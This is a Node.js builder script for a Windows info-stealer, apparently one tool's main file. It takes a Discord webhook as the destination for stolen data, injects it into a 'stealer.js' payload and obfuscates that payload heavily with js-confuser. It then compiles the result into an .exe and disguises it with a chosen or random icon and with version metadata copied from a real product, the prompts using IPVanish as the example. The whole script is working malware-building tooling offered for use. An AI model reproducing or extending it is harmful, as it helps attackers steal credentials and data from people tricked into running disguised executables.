(async () => {
    console.clear()
    process.title = ''

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Follow the step by step instructions written in "README.md" to avoid problems.

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fs = require('fs'),
        path = require('path'),
        os = require('os'),
        cmd = require('child_process'),
        readline = require('readline'),
        crypto = require('crypto')

    const fetch = (await import('node-fetch')).default,
        formdata = require('form-data'),
        words = (await import('random-words')).generate,
        confuser = require('js-confuser'),
        chalk = (await import('chalk')).default

    const tar = require('tar'),
        pkg = require('@yao-pkg/pkg'),
        resedit = (await import('resedit-cli')).default

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const sleep = (ms) => new Promise(async (resolve) => setTimeout(resolve, ms))

    const question = (c) => new Promise(async (resolve) => {
        const rl = readline.createInterface({
            'input': process.stdin,
            'output': process.stdout,
            'setEncoding': 'utf8'
        })

        return rl.question(c, async (a) => {
            rl.close()
            resolve(a)
        })
    })

    async function shuffle(array) {
        return await new Promise(async (resolve) => {
            const a = [...array]
            let c = a.length
            let d

            while (c !== 0) {
                d = Math.floor(Math.random() * c)
                c--

                [a[c], a[d]] = [a[d], a[c]]
            }

            resolve(a)
        })
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.cyan(`
        ██████╗ ██╗   ██╗██╗██╗     ██████╗ 
        ██╔══██╗██║   ██║██║██║     ██╔══██╗
        ██████╔╝██║   ██║██║██║     ██║  ██║ V1.0 By PantherOwO
        ██╔══██╗██║   ██║██║██║     ██║  ██║
        ██████╔╝╚██████╔╝██║███████╗██████╔╝
        ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═════╝ \n`))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const webhook = await question(chalk.bold.cyan('[#] Which webhook will you use: '))

    if (!webhook || !new RegExp(['api/webhooks', 'https'].join('|')).test(webhook) || webhook.split('/').length !== 7) {
        return console.log(chalk.bold.red('[@] The webhhok format is invalid.'))
    }

    let webhook_api

    try {
        const api = await (await fetch(webhook)).json()
        if (api.id) {
            webhook_api = true
        }
    } catch (e) {
        return console.log(chalk.bold.red('[@] An error occurred while performing the webhook request:', e))
    }

    if (!webhook_api) {
        return console.log(chalk.bold.red('[@] This webhook is invalid, please try again.'))
    } else {
        console.log(chalk.bold.green('[$] Webhook successfully validated:', webhook))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    let name = await question(chalk.bold.cyan('[#] Choose a name for the executable (Leave empty for a random name): '))
    name = name ? name : words()

    try {
        await fs.promises.writeFile(path.join(os.tmpdir(), `${name}.exe`), '')
        await fs.promises.rm(path.join(os.tmpdir(), `${name}.exe`))
    } catch (e) {
        return console.log(chalk.bold.red('[@] This name cannot be used as it is not suitable, please try again:', e))
    }

    console.log(chalk.bold.green('[$] The executable name has been set to:', name))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    let source = await fs.promises.readFile(path.join(__dirname, 'src', 'stealer.js'), 'utf-8')
    source = source.replace('*WEBHOOK*', webhook)

    console.log(chalk.bold.yellow('[#] Obfuscating the main file of the stealer.'))

    let obfuscate

    try {
        obfuscate = await confuser.obfuscate(source, {
            "target": "node",
            "preset": "low",
            "compact": false,
            "hexadecimalNumbers": true,
            "minify": false,
            "es5": false,
            "renameVariables": true,
            "renameGlobals": true,
            "identifierGenerator": "randomized",
            "controlFlowFlattening": 1,
            "globalConcealing": false,
            "stringCompression": 1,
            "stringConcealing": 1,
            "stringEncoding": 1,
            "stringSplitting": 1,
            "duplicateLiteralsRemoval": true,
            "dispatcher": 1,
            "rgf": 1,
            "flatten": 1,
            "objectExtraction": false,
            "deadCode": 1,
            "calculator": 1,
            "movedDeclarations": true,
            "opaquePredicates": 1,
            "shuffle": {
                "hash": 0.5,
                "true": 0.5
            },
            "stack": 1
        })

        await fs.promises.writeFile(path.join(__dirname, 'src', 'index.js'), obfuscate)

        console.log(chalk.bold.green('[#] File obfuscated successfully.'))
    } catch (e) {
        return console.log(chalk.bold.red('[@] Error obfuscating the file:', e))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    let icons = (await fs.promises.readdir(path.join(__dirname, 'resources', 'icon'))).filter(o => o.endsWith('.ico'))
    let icon = []

    if (icons.length > 0) {
        for (let i = 0; icons.length > i; i++) {
            icon.push(`${i + 1}- ${icons[i]}`)
        }

        icon = await question(chalk.bold.cyan(`[#] Choose one of the icons below (If you want a random icon, choose 0):\n\n${icon.join('\n')}\n\n[0/${icons.length}]: `))

        if (!icon || isNaN(Number(icon)) || Number(icon) > (Number(icons.length))) {
            return console.log(chalk.bold.red('[@] You have made an invalid choice, please try again.'))
        }

        if (Number(icon) !== 0) {
            icon = path.join(__dirname, 'resources', 'icon', `${icons[icon - 1]}`)
        }
    }

    if (!fs.existsSync(icon)) {
        if (icons.length === 0) {
            console.log(chalk.bold.yellow('[#] No icon was found so it will be random.'))
        }

        icon = (await shuffle((await (await fetch('https://pixlr.com/api/image-generator/feeds/recent/1/')).json()).data.docs.map(o => o.images[0]?.preview)))[0]

        const form = new formdata()
        form.append('file', icon)
        form.append('icontype', '1')
        form.append('imagesize[]', '16x16')
        form.append('imagesize[]', '32x32')
        form.append('imagesize[]', '48x48')
        form.append('imagesize[]', '64x64')
        form.append('imagesize[]', '128x128')
        form.append('customsize', '')
        form.append('code', '84000')
        form.append('targetformat', 'ico')
        form.append('filelocation', 'online')
        form.append('oAuthToken', '')
        form.append('legal', 'Our PHP programs can only be used in aconvert.com. We DO NOT allow using our PHP programs in any third-party websites, software or apps. We will report abuse to your cloud provider, Google Play and App store if illegal usage found!')

        try {
            icon = await (await fetch('https://s10.aconvert.com/convert/convert9.php', {
                'method': 'POST',
                'body': form,
                'headers': {
                    ...form.getHeaders(),
                    'origin': 'https://www.aconvert.com',
                    'referer': 'https://www.aconvert.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'
                }
            })).json()

            if (icon?.state !== 'SUCCESS') {
                return console.log(chalk.bold.red('[@] Could not generate the random icon.'))
            }

            icon = await (await fetch(`https://s10.aconvert.com/convert/p3r68-cdx67/${icon.filename}-001.ico`)).buffer()
            await fs.promises.writeFile(path.join(__dirname, 'resources', 'icon', `${name}.ico`), icon)
            icon = path.join(__dirname, 'resources', 'icon', `${name}.ico`)
        } catch {
            return console.log(chalk.bold.red('[@] An error occurred in the request in the convert files api.'))
        }
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    let versions = (await fs.promises.readdir(path.join(__dirname, 'resources', 'version'))).filter(o => o.endsWith('.json'))
    let version = []

    if (versions.length === 0) {
        version = await question(chalk.bold.cyan('[#] No predefined configuration was found for the version, do you want to create one? (y/n): '))

        if (!['y', 'n'].includes(version)) {
            return console.log(chalk.bold.red('[@] You have made an invalid choice, please try again.'))
        }

        if (version === 'y') {
            version = {}

            console.log(chalk.bold.cyan('[%] Warning: what is in parenthesis is just an example, they are all oppositional if you don\'t want to just press enter to jump.'))

            version.companyName = (await question(chalk.bold.cyan('[#] Company name (IPVanish, a Ziff Davis company): '))) || ''
            version.fileDescription = (await question(chalk.bold.cyan('[#] File Description (IPVanish): '))) || ''
            version.fileVersion = (await question(chalk.bold.cyan('[#] File version (4.2.6.358): '))) || ''
            version.internalName = (await question(chalk.bold.cyan('[#] Internal name (IPVanish.exe): '))) || ''
            version.legalCopyright = (await question(chalk.bold.cyan('[#] Copyright (\xA9 2019-2024 IPVanish, a Ziff Davis company. All rights reserved.): '))) || ''
            version.originalFileName = (await question(chalk.bold.cyan('[#] Original filename (IPVanish.exe): '))) || ''
            version.productName = (await question(chalk.bold.cyan('[#] Product name (IPVanish): '))) || ''
            version.ProductVersion = (await question(chalk.bold.cyan('[#] Product version (4.2.6.358-a2aa3817): '))) || ''

            await fs.promises.writeFile(path.join(__dirname, 'resources', 'version', `${name}.json`), JSON.stringify(version, null, 3))
        }

        if (version === 'n') {
            version = {}
        }
    } else {
        for (let i = 0; versions.length > i; i++) {
            version.push(`${i + 1}- ${versions[i]}`)
        }

        version = await question(chalk.bold.cyan(`[#] Choose one of the versions below (if not here be choice 0):\n\n${version.join('\n')}\n\n[0/${versions.length}]: `))

        if (!version || isNaN(Number(version)) || Number(version) > (Number(versions.length))) {
            return console.log(chalk.bold.red('[@] You have made an invalid choice, please try again.'))
        }

        version = Number(version) === 0 ? {} : JSON.parse(await fs.promises.readFile(path.join(__dirname, 'resources', 'version', `${versions[version - 1]}`), 'utf-8'))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const gzip = await new Promise(async (resolve) => {
        console.log(chalk.bold.green('[$] Preparing additional resources.'))

        await tar.create({
            'gzip': true,
            'file': path.join(__dirname, 'src', 'app.tgz'),
            'cwd': path.join(__dirname, 'src')
        }, [
            path.join(__dirname, 'resources', 'pkg', 'node-22.9')
        ]).then(buffer => {
            console.log(chalk.bold.green("[$] Project files compressed"))

            const hash = crypto.createHash('sha256')
            const rs = fs.createReadStream(__dirname + '/src/app.tgz')

            console.log(chalk.bold.yellow("[#] Calculating the SHA-256 hash of the file 'app.tgz'."))

            rs.on('error', (data) => {
                if (data) {
                    resolve(false)
                }
            })

            rs.on('data', (data) => {
                hash.update(data)
            })

            rs.on('end', async () => {
                console.log(chalk.bold.green('[$] Calculation successfully performed.'))

                await fs.promises.writeFile(path.join(__dirname, 'src', 'app.tgz.sha256'), hash.digest('hex'))
                resolve(true)
            })
        }).catch(o => {
            if (o) {
                resolve(false)
            }
        })
    })

    if (!gzip) {
        return console.log(chalk.bold.red('[@] Error preparing the additional resources.'))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    if (!fs.existsSync(path.join(__dirname, 'src', 'node_modules', 'windcrypt', 'build', 'Release', 'windcrypt.node'))) {
        console.log(chalk.bold.yellow('[#] Could not find the windcrypt build, trying to resolve the issue.'))

        const windcrypt = await new Promise(async (resolve) => {
            cmd.exec('cd ./src && npm uninstall windcrypt && npm i windcrypt', (e, o) => {
                if (e) {
                    resolve(e)
                } else {
                    resolve(true)
                }
            })
        })

        if (windcrypt !== true) {
            return console.log(chalk.bold.red('[@] Unable to resolve:', windcrypt))
        }

        console.log(chalk.bold.green('[$] Success, windcrypt was successfully bullied.'))
    }

    if (!fs.existsSync(path.join(__dirname, 'src', 'node_modules', 'better-sqlite3', 'build', 'Release', 'better_sqlite3.node'))) {
        console.log(chalk.bold.yellow('[#] Could not find the better-sqlite3 build, trying to resolve the issue.'))

        const bettersqlite3 = await new Promise(async (resolve) => {
            cmd.exec('cd ./src && npm uninstall better-sqlite3 && npm i better-sqlite3 --force', (e, o) => {
                if (e) {
                    resolve(e)
                } else {
                    resolve(true)
                }
            })
        })

        if (bettersqlite3 !== true) {
            return console.log(chalk.bold.red('[@] Unable to resolve:', bettersqlite3))
        }

        console.log(chalk.bold.green('[$] Success, better-sqlite3 was successfully bullied.'))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.yellow('[#] Redeveloping native modules.'))

    let native = await new Promise(async (resolve) => {
        cmd.exec('cd ./src && cd ./node_modules/windcrypt && npx node-gyp rebuild --target=20.0.0 && cd ../.. && cd ./node_modules/better-sqlite3 && npx node-gyp rebuild --target=20.0.0', async (err, ok) => {
            if (err) {
                resolve(err)
            } else {
                resolve(true)
            }
        })
    })

    if (native !== true) {
        return console.log(chalk.bold.red('[@] Error when rebiuding native modules:', native))
    }

    console.log(chalk.bold.green('[#] Success in rebiuding the native modules!'))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.yellow('[#] Creating the executable.'))

    try {
        await pkg.exec([
            path.join(__dirname, 'src', 'index.js'),
            '-t', 'node20-windows-x64',
            '-c', path.join(__dirname, 'src', 'package.json'),
            '-o', path.join(__dirname, `${name}.exe`)
        ])

        console.log(chalk.bold.green('[$] Successfully created executable.'))
    } catch (e) {
        return console.log(chalk.bold.red('[@] An error occurred during the creation of the executable:', e))
    }

    await sleep(1000)

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.yellow('[#] Changing the executable information.'))

    try {
        await resedit({
            'in': `./${name}.exe`,
            'out': `./${name}.exe`,
            'definition': {
                'version': version,
                'icons': [{
                    'id': 1,
                    'sourceFile': icon
                }]
            }
        })

        console.log(chalk.bold.green('[$] Successfully changed executable information.'))
    } catch (e) {
        console.log(e)
        return console.log(chalk.bold.red('[@] An error occurred while changing the executable information.'))
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.yellow('[#] Deleting temporary files.'))

    try {
        await fs.promises.unlink(path.join(__dirname, 'src', 'app.tgz'))
        await fs.promises.unlink(path.join(__dirname, 'src', 'app.tgz.sha256'))
        return console.log(chalk.bold.green('[$] Files deleted successfully.'))
    } catch (e) {
        console.log(chalk.bold.red('[@] An error occurred while deleting the temporaris files:', e))
    }
})()